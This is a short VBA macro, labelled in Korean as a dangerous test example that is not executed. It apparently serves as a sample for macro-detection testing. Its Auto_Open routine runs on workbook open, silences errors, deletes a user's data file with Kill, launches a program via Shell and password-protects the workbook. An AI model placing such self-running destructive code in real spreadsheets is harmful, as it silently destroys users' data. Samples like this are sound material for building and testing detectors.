' 위험한 예시 (시험용 글자일 뿐 실행되지 않음)
Sub Auto_Open()
    On Error Resume Next
    Application.ScreenUpdating = False
    Dim p
    p = "C:\Users\kim\data.xlsx"
    Kill p
    Shell "notepad.exe", 1
    Set o = CreateObject("Scripting.FileSystemObject")
    Sheets("a").Select
    ActiveWorkbook.Protect Password:="1234"
End Sub
